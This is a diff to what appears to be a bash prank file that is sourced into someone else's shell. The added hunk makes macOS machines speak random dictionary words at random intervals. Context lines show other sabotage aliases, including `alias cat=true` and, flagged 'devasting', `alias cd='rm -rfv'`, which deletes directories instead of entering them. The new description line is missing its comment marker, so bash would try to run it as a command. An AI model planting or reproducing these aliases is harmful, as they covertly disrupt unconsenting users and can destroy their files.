@@ -56,6 +56,11 @@ annoying && alias cat=true;
 # Use a random sort option whenever `ls` is invoked.
 annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
+Taunt OS X users with random words through their speakers
+annoying && if [ "$(uname)" = 'Darwin' ]; then
+  sh -c 'sleep $[($RANDOM % 900) + 300]s; say $(head -$(($RANDOM % $(wc -l < /usr/share/dict/words) + 1)) /usr/share/dict/words | tail -2);' &
+fi
+
 # Delete directories instead of entering them.
 devasting && alias cd='rm -rfv';
 
